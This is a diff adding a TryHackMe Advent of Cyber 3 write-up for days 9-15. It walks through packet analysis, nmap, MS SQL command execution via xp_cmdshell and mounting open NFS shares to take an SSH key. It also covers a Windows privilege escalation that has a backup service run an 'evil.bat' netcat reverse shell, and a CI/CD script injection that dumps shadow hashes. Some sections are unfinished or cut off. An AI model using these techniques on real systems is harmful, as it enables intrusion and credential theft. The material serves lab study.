@@ -1,0 +1,560 @@
+---
+title: TryHackMe – Advent of Cyber 3 – [Days 9-15] 
+author: Kaleb Humpal
+date_created: 2021-12-15
+summary: Writeup for Days 9-15 of Try Hack Me's 3rd Advent of Cyber event, covering the topics of Networking and Cyber Careers.
+tags: [cyber security, hacking, tryhackme, offensive security, pentest, penetration testing, pentesting, christmas, event, networking, cyber careers, careers in cyber, careers in cyber security, careers]
+---
+
+## [Day 9] `Networking` Where Is All This Data Going
+
+<Image wide src="#" />
+
+After reading through the first sections about Wireshark, filtering the information, and then getting to HTTP GET requests. It tells me `Keep following the **GET** HTTP requests and answer the question in this task.`
+
+## Questions 
+
+### 1. In the *HTTP #1 - GET* requests section, which directory is found on the web server?
+<Image wide src="../../static/img/AoC3/day9-Q1.png" />
+
+So after running moving to the directory that contains the `.pcap` file. I run `wireshark FILENAME.pcap`, for me on my system, I have it as `wireshark AoC3Day9.pcap`. That opens up the wireshark window with the specified file. With following what it said above, and with filtering by `http.request.method == GET`, let's ***GET*** looking for the answer.. haha The first request shows `/login`, with the next request showing `/login/` which sort of shows that it is a directory. 
+
+#### Flag
+So the flag is `login`.
+
+Before moving on, in the first packet, I see something, I think the returned information from the `GET` request. Shows 
+```
+GET /login HTTP/1.1
+Host: 10.10.10.4
+User-Agent: TryHackMe-UserAgent-THM{d8ab1be969825f2c5c937aec23d55bc9}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+```
+Looks like a flag for later.
+
+### 2. What is the username and password used in the login page in the *HTTP #2 - POST* section?
+<Image wide src="../../static/img/AoC3/day9-Q2.png" />
+
+I followed the instructions, it tells me to right click on the required packet and then select `follow -> TCP Stream` to see the web requests and their details. After doing that, I get `Follow TCP Stream` window. As I look through the `POST` request sent to `/login/login.php`, I see `username=McSkidy&password=Christmas2021%21`
+
+#### Flag
+There it is! `McSkidy:Christmas2021 21`
+
+### 3. What is the User-Agent's name that has been sent in *HTTP #2 - POST* section?
+I think this is the same information I saw earlier. I see it in the `Follow TCP Stream` too. 
+
+#### Flag
+`TryHackMe-UserAgent-THM{d8ab1be969825f2c5c937aec23d55bc9}`
+
+### 4. In the DNS section, there is a TXT DNS query. What is the flag in the message of that DNS query?
+<Image wide src="../../static/img/AoC3/day9-Q4.png" />
+
+For this one, I am just scrolling through all the `dns` packets, looking at the `Info` column for something about `TXT`. I found one! 
+Inside of the `Follow UDP Stream`, there is 
+```Y............packet	tryhackme.com.....Y............packet	tryhackme.com............	:..87AoC3 is awesome - THM{dd63a80bf9fdd21aabbf70af7438c257}```
+
+#### Flag
+`THM{dd63a80bf9fdd21aabbf70af7438c257}`
+
+### 5. In the FTP section, what is the FTP login password?
+When going to the `Follow TCP Stream` of the `FTP Request: USER`, it gives me the following data:
+```
+220 (vsFTPd 3.0.3)
+USER tryhackftp
+331 Please specify the password.
+PASS TryH@ckM3!
+230 Login successful.
+CWD /files
+250 Directory successfully changed.
+PASV
+227 Entering Passive Mode (10,10,10,4,210,245).
+STOR secret.txt
+150 Ok to send data.
+226 Transfer complete.
+```
+#### Flag
+`TryH@ckM3!`
+
+### 6. In the FTP section, what is the FTP command used to upload the `secret.txt` file?
+<Image wide src="../../static/img/AoC3/day9-Q6.png" />
+
+Staying in the `FTP` filtered packets, I scroll down and see `Request: STOR secret.txt` in the `Info` column.
+
+#### Flag
+The command used is `STOR`
+
+### 7. In the FTP section, what is the content of the secret.txt file?
+<Image wide src="../../static/img/AoC3/day9-Q7.png" />
+
+Using the filter `ftp-data`, it gives me one packet for that protocol. Double-clicking on it, and looking at the `Line-based text data (1 lines)`, I find `AoC Flag: 123^-^321\n`
+
+#### Flag
+`123^-^321`
+
+---
+
+## [Day 10] `Networking` Offensive Is The Best Defence
+
+<Image wide src="#" />
+
+After reading through about `Protocols and Servers`, `Ports`, `Nmap` and possibly watching [`Philip Wylie`'s Video](https://www.youtube.com/watch?v=yHjD_07r5xs). Let's get to the questions. 
+
+## Questions 
+### 1. Help McSkidy and run `nmap -sT 10.10.122.171`. How many ports are open between 1 and 100
+After we run this `nmap` scan, we get:
+```
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+#### Flag
+So that is `2` ports open.
+
+### 2. What is the smallest port number that is open?
+#### Flag
+From the last scan, we can see that port `22` is the smallest.
+
+### 3. What is the service related to the highest port number you found in the first question?
+#### Flag
+Also from the last scan, we can see that the highest port number (`80`) has the service `http`.
+
+### 4. Now run `nmap -sS 10.10.122.171`. Did you get the same results?(Y/N)
+#### Flag
+When I run this, we can see that they have the same results, so `y`.
+
+### 5. If you want Nmap to detect the version info of the services installed, you can use `nmap -sV 10.10.122.171`. What is the version number of the web server?
+Running this `nmap` command gives me:
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh	 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http	 Apache httpd 2.4.49
+```
+#### Flag
+`Apache httpd 2.4.49`
+
+### 6. By checking the [vulnerabilities related to the installed web server](https://httpd.apache.org/security/vulnerabilities_24.html), you learn that there is a critical vulnerability that allows path traversal and remote code execution. Now you can tell McSkidy that Grinch Enterprises used this vulnerability. What is the CVE number of the vulnerability that was solved in version 2.4.51?
+When I click on [the link](https://httpd.apache.org/security/vulnerabilities_24.html) and I look at the `Fixed in Apache HTTP Server 2.4.51`, and under that I can see `***critical: Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.49 and 2.4.50 (incomplete fix of CVE-2021-41773) (CVE-2021-42013)***`. 
+#### Flag
+The above is telling me that a critical fix that is being implemented in 2.4.51 was a fix of a past incomplete fix, and the new critical fix is has the CVE number of `CVE-2021-42013`.
+
+### 7. You are putting the pieces together and have a good idea of how your web server was exploited. McSkidy is suspicious that the attacker might have installed a backdoor. She asks you to check if there is some service listening on an uncommon port, i.e. outside the 1000 common ports that Nmap scans by default. She explains that adding `-p1-65535` or `-p-` will scan all 65,535 TCP ports instead of only scanning the 1000 most common ports. What is the port number that appeared in the results now?
+Let's run `nmap -p- -sV 10.10.122.171`...
+That gave us the same as the other scans, with the added port, `20212/tcp open  telnet  Linux telnetd`
+#### Flag
+So the port is `20212`.
+
+### 8. What is the name of the program listening on the newly discovered port?
+#### Flag
+And from the last scan, the program that is listening is `telnetd`.
+
+---
+
+## [Day 11] `Networking` Where Are The Reindeers?
+
+<Image wide src="../../static/img/AoC3/#" />
+
+Day 11 had a lot less to read at the beginning, it's a lot more walkthrough-ish I think. You have the option to watch [`Tib3rius`' Video](https://www.youtube.com/watch?v=VJ2YFzTMqNY). (***I tend to watch them after to learn more and sometimes go along with them to try the things I didn't do in my run of the challenge.***)
+
+## Questions 
+*You decided that the first step would be to check the running services on `10.10.187.85`. You resort to yesterday’s tool, Nmap.*
+
+*Knowing that `10.10.187.85` is a MS Windows system, you expect it to not respond to ping probes by default; therefore, you need to add `-Pn` to your `nmap` command to perform the scan. This instructs Nmap to skip pinging the target to see if the host is reachable. Without this option, Nmap will assume the target host is offline and not proceed with scanning.* 
+
+### 1. There is an open port related to MS SQL Server accessible over the network. What is the port number?
+I'll run `nmap -sS -Pn 10.10.187.85`. With that, I get the following:
+```console
+PORT     STATE SERVICE
+22/tcp   open  ssh
+135/tcp  open  msrpc
+1433/tcp open  ms-sql-s
+3389/tcp open  ms-wbt-server
+```
+#### Flag
+`1433`
+
+*Knowing the MS SQL Server is running and accessible over the network, we want to check if our username and password are still valid. Using the AttackBox terminal, we will use the command sqsh (pronounced skwish), an interactive database shell.*
+
+*A simple syntax would be `sqsh -S server -U username -P password`, where:*
+
+*`-S server` is used to specify the server, for example `-S 10.10.187.85`
+-`U username` is used to provide the username; for example, `-U sa` is the username that we have enabled.
+-`P password` lets us specify the password.
+Let’s try to run, `sqsh -S 10.10.187.85 -U sa -P t7uLKzddQzVjVFJp`*
+
+### 2. If the connection is successful, you will get a prompt. What is the prompt that you have received?
+Like we are told above, we run the command given and after a little while of loading, we get the prompt:
+#### Flag
+`1>`
+
+*McDatabaseAdmin told us the database name is `reindeer` and it has three tables:*
+
+*1. `names`
+2. `presents`
+3. `schedule`
+To display the table `names`, you could use the following syntax, `SELECT * FROM table_name WHERE condition`.*
+(It then goes on to explain how to type it all out and shows the `sqsh` command finished already, but let's do that ourselves!)
+
+### 3. We can see four columns in the table displayed above: id, first(name), last(name), and nickname. What is the first name of the reindeer of id 9?
+When I put the SQL command, `SELECT * FROM reindeer.dbo.names;`, into `sqsh`, I get the following:
+```sql
+1> SELECT * FROM reindeer.dbo.names;
+2> go
+ id          first                                    last                                     nickname
+ ----------- ---------------------------------------- ---------------------------------------- ----------------------------------------
+           1 Dasher                                   Dasher                                   Dasher
+           2 Dancer                                   Dancer                                   Dancer
+           3 Prancer                                  Prancer                                  Prancer
+           4 Vixen                                    Vixen                                    Vixen
+           5 Comet                                    Comet                                    Comet
+           6 Cupid                                    Cupid                                    Cupid
+           7 Donner                                   Donder                                   Dunder
+           8 Blitzen                                  Blixem                                   Blitzen
+           9 Rudolph                                  Reindeer                                 Red Nosed
+
+(9 rows affected)
+```
+#### Flag
+The first name of the reindeer of id 9 is `Rudolph`.
+
+### 4. Check the table 	`schedule`. What is the destination of the trip scheduled on December 7?
+For this one, let's run:
+```sql
+1> SELECT * FROM reindeer.dbo.schedule;
+2> go
+
+	id       date              destination               notes
+
+	-------- ----------------- ------------------------ ---------------------------
+
+	2000     dic  5 2021 12:00 Tokyo                     NULL
+
+	2001     dic  3 2021 12:00 London                    NULL
+
+	2002     dic  1 2021 12:00 New York                  NULL
+
+	2003     dic  2 2021 12:00 Paris                     NULL
+
+	2004     dic  4 2021 12:00 California                NULL
+
+	2005     dic  7 2021 12:00 Prague                    NULL
+
+	2006     dic 11 2021 12:00 Bangkok                   NULL
+
+	2007     dic 10 2021 12:00 Seoul                     NULL
+
+(8 rows affected)
+```
+#### Flag
+The destination of the trip that is scheduled on December 7 is `Prague`.
+
+### 5. Check the table 	`presents`. What is the quantity available for the present "Power Bank"?
+This SQL command can be:
+```sql
+1> SELECT * FROM reindeer.dbo.presents;
+2> go
+ id          name                                                   quantity   
+ ----------- ------------------------------------------------------ -----------
+         100 Blanket                                                		500
+         101 Laptop                                                 	   1000
+         102 Cooler                                                         250
+         103 BT Speaker                                                    1000
+         104 THM Subscription                                            100000
+         105 Alarm Clock                                                    500
+         106 Cookies                                                      10000
+         107 THM T-Shirt                                                 100000
+         108 Power Bank                                                   25000
+         109 USB Hub                                                      15000
+
+(10 rows affected)
+```
+#### Flag
+The quantity that is available for the present that is called "Power Bank" is `25000`.
+
+*You have done fantastic work! You have helped McDatabaseAdmin retrieve the schedule! Now, let’s see if we can run MS Windows commands while interacting with the database. Some MS SQL Servers have `xp_cmdshell` enabled. If this is the case, we might have access to something similar to a command prompt.*
+
+*The command syntax is `xp_cmdshell 'COMMAND';`. Let’s try a simple command, `whoami`, which shows the user running the commands.......*
+
+*We can run other commands that we can execute on the MS Windows command line. For example, we can use `dir` to list files and directories and `type filename` to display the contents of a file......*
+
+### 6. There is a flag hidden in the `grinch` user's home directory. What are its contents?
+All right, so let's make use of these `type` and `dir` commands for `MS Windows command line`. Since we are going for the `grinch` user, let's `dir` the directory `C:\Users\grinch`(*In that format because it's windows command line and we are looking for the user `grinch`*). So I'll run `xp_cmdshell 'dir C:\Users\grinch';`, and that gives me a list of the directories in the `grinch`'s home: `., .., 3D, Object, Contacts, Desktop, Documents, Downloads, Favorites, Links, Music, Pictures, Saved Game, Searches, Videos`. </br>
+From here, let's take a look inside of the `Documents` directory with: `xp_cmdshell 'dir C:\Users\grinch';`, and there is the flag file! `flag.txt`. We can then run `xp_cmdshell 'type C:\Users\grinch\Documents\flag.txt';`
+
+#### Flag
+`THM{YjtKeUy2qT3v5dDH}`
+
+### 7. Congratulations, the flag you have recovered contains the password of `McDatabaseAdmin`! In this task, we learned how to use `sqsh` to interact with a MS SQL Server. We learned that if `xp_cmdshell` is enabled, we can execute system commands and read the output using `sqsh`.
+#### Flag
+`No answer needed`# [Day 12] `Networking` Sharing Without Caring
+## Story
+Grinch Enterprises has been leaving traces of how their hackers have been accessing data from the system - you’ve found a unique server they use. We need your help to find out what method they’ve been using to extract any data.
+
+We have noticed that `10.10.20.235` is generating unusual traffic. We highly suspect that Grinch Enterprises are using it to access our data. We will use Nmap to discover the services are running on their server.
+
+## Questions 
+
+### 1. Scan the target server with the IP `10.10.20.235`. Remember that MS Windows hosts block pings by default, so we need to add `-Pn`, for example, `nmap -Pn 10.10.20.235` for the scan to work correctly. How many TCP ports are open?
+After scanning with the given `nmap` command, using the `-Pn(Treat all hosts as online -- skip host discovery)` to get around the MS Windows host blocking the pings sent to it. We get the following output:
+```console
+PORT     STATE SERVICE
+22/tcp   open  ssh
+111/tcp  open  rpcbind
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+2049/tcp open  nfs
+3389/tcp open  ms-wbt-server
+```
+#### Flag
+We can count up the open TCP ports, and get `7`.
+
+***Network File System (NFS) is a protocol that allows the ability to transfer files between different computers and is available on many systems, including MS Windows and Linux. Consequently, NFS makes it easy to share files between various operating systems.***
+
+### 2. In the scan results you received earlier, you should be able to spot NFS or mountd, depending on whether you used the `-sV` option with Nmap or not. Which port is detected by Nmap as NFS or using the mountd service?
+#### Flag
+In the same results we can see that the port related to *nfs* is `2049`.
+
+***Now that we have discovered an NFS service is listening, let’s check what files are being shared. We can do this using the command `showmount`. In the terminal below, we run `showmount -e 10.10.20.235`. The `-e` or `--exports` show the NFS server’s export list.***
+### 3. How many shares did you find?
+After installing showmount on my machine with `sudo apt install nfs-common`, I run the command now:
+```console
+$ showmount -e 10.10.108.179
+Export list for 10.10.108.179:
+/share        (everyone)
+/admin-files  (everyone)
+/my-notes     (noone)
+/confidential (everyone)
+``` 
+#### Flag
+There are `4` shares.
+
+### 4. How many shares show "everyone"?
+#### Flag
+In the same results, we can see that there are `3` shares that show "everyone". 
+
+***Let’s try to mount the shares we have discovered. We can create a directory on the AttackBox using `mkdir tmp1`, where `tmp1` is the directory’s name. Then we can use this directory  we created to mount the public NFS share using: `mount 10.10.20.235:/my-notes tmp1`.***
+
+### 5. What is the title of file 2680-0.txt?
+```console
+$ sudo mount 10.10.108.179:/my-notes tmp1
+mount.nfs: access denied by server while mounting 10.10.108.179:/my-notes
+```
+Trying to mount to the share that has noone has access to will return the above. So let's instead mount the `share` folder with `sudo mount 10.10.108.179:/share tmp1`. From there, we can `cd` into the `tmp1` directory and `ls` to see the shared files. We see two files `132-0.txt` and `2680-0.txt`, let's use `less 2680-0.txt` to be able to go through the text file little by little.
+#### Flag
+We can see a little ways down that it it the book `MEDITATIONS` by Marcus Aurelius.
+
+### 6. It seems that Grinch Enterprises has forgotten their SSH keys on our system. One of the shares contains a private key used for SSH authentication (`id_rsa`). What is the name of the share?
+Let's check the other shares, we'll `umount` the current share(`/share`) and `mount` another. If we try to mount `/admin-files`, access is denied:
+```console
+$ sudo mount 10.10.177.190:/admin-files tmp1
+mount.nfs: access denied by server while mounting 10.10.177.190:/admin-files
+```
+`/my-notes` is access to noone, so let's try to mount `/confidential`.
+```console
+$ sudo mount 10.10.177.190:/confidential tmp1
+$ cd tmp1
+$ ls
+ssh
+$ cd ssh
+$ ls
+id_rsa  id_rsa.pub
+```
+#### Flag
+There it is, so the id_rsa file is inside of `confidential`
+
+### 7. We can calculate the MD5 sum of a file using `md5sum FILENAME`. What is the MD5 sum of `id_rsa`?
+While inside of the `tmp1/ssh` directory, we can run `md5sum id_rsa` to get the flag for this one.
+#### Flag
+`3e2d315a38f377f304f5598dc2f044de`
+
+---
+
+## [Day 13] `Networking` They Lost The Plan!
+McSkidy has realized that she worked on a rough draft of a disaster recovery plan but locked down the permissions on the file to ensure that it was safe. However, the Grinch accessed the local system and reduced the permissions of her account. Can you elevate her privileges and get the file back?
+
+After reading through the lesson and learning about `Escalating Privileges`, `Windows Privelege Escalation Vectors`, `Initial Information Gathering` after gaining access to a system, `Exploitation` of the found vectors, and possibly watching [`HuskyHacks`' Video](https://www.youtube.com/watch?v=zIR7Is90N30), we can use what we learned to start with the questions.
+
+## Questions 
+### 1. Complete the username: p.....
+Once we get the Machine loaded up and enter the split screen to access the Virtual Machine through the browser, we are put straight onto the Desktop to figure these out. </br>
+To find out the user for this question, let's open up `PowerShell` and run `net users`:
+```PowerShell
+PS C:\Users\McSkidy> net users
+
+User accounts for \\THE-GRINCH-HACK
+
+-------------------------------------------------------------
+Administrator 			 Alabaster 			 DefaultAccount
+Guest 					 McSkidy 			 pepper
+Rudolph 				 sugarplum			 thegrinch
+WDAUtilityAccount
+The command completed successfully.
+```
+#### Flag
+From the results of the 'net users' command, we can see the only username that could match is `pepper`.
+
+### 2. What is the OS version?
+To get the flag for this one, we should run the `systeminfo` command to get all of the information about the Windows system we are on. Running that gives a big chunk of stuff. We'll just look near the top of that information for the `OS Version`.
+#### Flag
+Running that command in PowerShell shows the Operating System as `10.0.17763 N/A Build 17763`.
+
+### 3. What backup service did you find running on the system?
+For this one, I think we should run something close to the command they gave us to use, `wmic service list`. If we run that alone, we get a long list of all of the services that we would need to manually search through. I think we could somehow use the '`pipe`' or '`|`' to send the output of the `wmic` command into the `findstr` command and search for the backup service within.</br>
+I tried using `wmic service list | findstr /L /I /C: "backup"` to search for strings `Literally(/L)` and make the search for "`backup`" `Not Case-Sensitive(/I)`. But I was receiving an error back for some reason as you will see below, so I tried something just barely different and it somehow worked:
+<Image wide src="../../static/img/AoC3/Day13-Q3-IperiusBackupService.png" />
+#### Flag
+But with that command, we can see a service called 'Iperius Backup Service' as `IperiusSvc`.
+
+### 4. What is the path of the executable for the backup service you have identified?
+#### Flag
+In the same command(the image above), we can see that 'IperiusSvc' is located at `C:\Program Files (x86)\Iperius Backup\IperiusService.exe`
+
+### 5. Run the whoami command on the connection you have received on your attacking machine. What user do you have?
+To get to this flag, we need to use the exploitation steps to take advantage of the `Iperius Backup Vulnerability`.
+First we will open up the IperiusService.exe and create a new backup task, set it to backup whatever, something like '`C:\Users\McSkidy\Documents`'. Then we will set the Destination in the destination tab to save the backup to '`C:\Users\McSkidy\Desktop`'. Before the next part within `Iperius`, we should first open `Notepad`, and add in the following to a new file:
+```batch
+@echo off
+C:\Users\McSkidy\Downloads\nc.exe 10.9.2.190 -e cmd.exe
+```
+(*The IP address should be switched with your attacking machine's IP*)
+We will click `Save as...` and save it to as `C:\Users\McSkidy\Desktop\evil.bat`. We then continue back to `Iperius`, there is an option to set other processes in the `Other Processes` tab, since the backup process is *ran with administrator privileges, any program or external file* used in the `Other Processes` tab will also be ran with administrator privileges. </br>
+Now before clicking `OK`, on the attacking machine, we should run `nc -nlvp 1337` to listen for a `nc`
+
+#### Flag
+`the-grinch-hack\thegrinch`
+
+### 6. What is the content of the flag.txt file?
+#### Flag
+`THM-736635221`
+
+### 7. The Grinch forgot to delete a file where he kept notes about his schedule! Where can we find him at 5:30?
+#### Flag
+`jazzercize`
+
+---
+
+## [Day 14] `Networking` Dev(Insecure)Ops
+McDev - the head of the dev team, sends an alarming email stating that they're unable to update the best festival company's external web application. Without this update, no one can view the Best Festival Company's plan. The dev team has been using a CI/CD server to automatically push out updates to the server but the CI/CD server has been compromised. Can you help them get their server back?
+
+After reading through the lesson about understanding what `CI/CD` is, the `Risks Associated with CI/CD`, and seeing a CI/CD simulation, and possibly watching [`Davin`'s Video](https://www.youtube.com/watch?v=NJVGTVbmWKM) unless watching after the questions, we can continue to the questions.
+
+## Questions 
+
+### 1. How many pages did the dirb scan find with its default wordlist?
+I'll just run `dirb http://10.10.32.115` to use the default wordlist
+```console
+$ dirb http://10.10.32.115
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Dec 22 22:57:07 2021
+URL_BASE: http://10.10.32.115/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612       
+
+---- Scanning URL: http://10.10.32.115/ ----
++ http://10.10.32.115/admin (CODE:200|SIZE:363)   
++ http://10.10.32.115/index.html (CODE:200|SIZE:169)
++ http://10.10.32.115/server-status (CODE:403|SIZE:277)
++ http://10.10.32.115/warez (CODE:200|SIZE:606)   
+                                                                               
+-----------------
+END_TIME: Wed Dec 22 23:04:55 2021
+DOWNLOADED: 4612 - FOUND: 4
+```
+#### Flag
+From the dirb results above, we can see that it found `4` pages.
+
+### 2. How many scripts do you see in the /home/thegrinch/scripts folder? 
+For this, I'll need to continue to follow the CI/CD simulation that they show in the lesson. If I head to `http://10.10.32.115` in the browser, there is a page with a picture of the Grinch and above him is a header saying "Waiting for the L00T! somewhere else
+But this works!" Let's go see what is at the `/admin` page, it gives us this:
+<Image wide src="../../static/img/AoC3/Day14-Q2-AdminPage.png" />
+*Looking at the source code, we see something interesting. There is an iFrame that refers to the `ls.html` page. This page seems suspiciously close to the output from running the `ls` command.*
+The lesson then tells me to connect to the target machine, so I did via `SSH` with `mcskidy:Password1`. Within, we can check where we are and what is around us:
+```console
+mcskidy@ip-10-10-32-115:~$ ls
+mcskidy@ip-10-10-32-115:~$ pwd
+/home/mcskidy
+mcskidy@ip-10-10-32-115:~$ ls ..
+mcskidy  pepper  thegrinch  ubuntu
+mcskidy@ip-10-10-32-115:~$ ls ../*
+../mcskidy:
+
+../pepper:
+
+../thegrinch:
+Desktop  loot  scripts
+
+../ubuntu:
+mcskidy@ip-10-10-32-115:~$ ls ../thegrinch/scripts
+check.sh  cleanup.sh  loot.sh  test.sh
+```
+#### Flag
+We can see that there are `4` scripts.
+
+### 3. What are the five characters following $6$G in pepper's password hash?
+If we keep going in the walkthrough, it tells us to try to view the contents of each script, but when I do, all of them return `Permission denied` except for `loot.sh`</br>
+If I 
+
+```iframe
+root:*:18561:0:99999:7::: daemon:*:18561:0:99999:7::: bin:*:18561:0:99999:7::: sys:*:18561:0:99999:7::: sync:*:18561:0:99999:7::: games:*:18561:0:99999:7::: man:*:18561:0:99999:7::: lp:*:18561:0:99999:7::: mail:*:18561:0:99999:7::: news:*:18561:0:99999:7::: uucp:*:18561:0:99999:7::: proxy:*:18561:0:99999:7::: www-data:*:18561:0:99999:7::: backup:*:18561:0:99999:7::: list:*:18561:0:99999:7::: irc:*:18561:0:99999:7::: gnats:*:18561:0:99999:7::: nobody:*:18561:0:99999:7::: systemd-network:*:18561:0:99999:7::: systemd-resolve:*:18561:0:99999:7::: syslog:*:18561:0:99999:7::: messagebus:*:18561:0:99999:7::: _apt:*:18561:0:99999:7::: lxd:*:18561:0:99999:7::: uuidd:*:18561:0:99999:7::: dnsmasq:*:18561:0:99999:7::: landscape:*:18561:0:99999:7::: sshd:*:18561:0:99999:7::: pollinate:*:18561:0:99999:7::: ubuntu:!:18942:0:99999:7::: thegrinch:$6$iiajscL7$7YgS0mCSs8ROHgS/4VP1itLix.T7onR26n4gdHFNAYnF/jVY7N4No11Yuy2RtLwXxJE3Vzl6zBdXXu5GUBJCj0:18942:0:99999:7::: mcskidy:$6$g81UcX1e$az/mXtNiOt9tMDb6lixDN3c1yH2GhcJVlAIWYB/WYNgujmxHafZdhD91ppxB.x7RIkH9DbpS6XQxe0piA2p2L1:18942:0:99999:7::: pepper:$6$GZUP42Y2$QYDESrTO9T517RDzR6cGXOANA/H4For7odahhn/DUdeWfEXtG9ZLHnZl4PLbfm8WF0GRB4ti9ij6w0NwBPunI/:18942:0:99999:7:::
+```
+
+#### Flag
+`ZUP42`
+
+### 4. What is the content of the flag.txt file on the Grinch's user’s desktop?
+
+```cat all scripts
+#Secret password reminder script V 1.0 response=$(curl -s http://localhost/ls.html) content=$(echo $response > /tmp/check.txt) if grep "remindme.txt" /tmp/check.txt then echo "ELFSareFAST" > /var/www/html/pass.html else echo "Error" > /dev/null # rm /tmp/check.txt fi #!/bin/bash rm /tmp/check.txt rm /var/www/html/pass.html #!/bin/bash cat /home/thegrinch/scripts/* > /var/www/html/ls.html
+```
+```bash
+#!/bin/bash
+
+cat /home/thegrinch/Desktop/flag.txt > /var/www/html/ls.html
+```
+
+```
+#!/bin/bash
+
+cat /home/thegrinch/scripts/* > /var/www/html/ls.html
+```
+
+#### Flag
+`DI3H4rdIsTheBestX-masMovie!`
+
+---
+
+## [Day 15] `Cyber Careers` The Grinchs day off
+McSkidy is exhausted, as defeating the Grinch is hard work! She thinks back to her early days when deciding which cyber career to pursue. Luckily for McSkidy, the Grinch has taken today off, giving you time to think about what career you'd like to go into after saving Christmas.
+
+
+After reading through the stuff about understanding `#`, `#`, and `#`, and possibly watching [`#`' Video]() 
+
+## Questions 
+
+### 1. 
+
+#### Flag
+
+### 2. 
+
+#### Flag
+
+### 3. 
+
+#### Flag
+
+
+### 4. 
+
+#### Flag
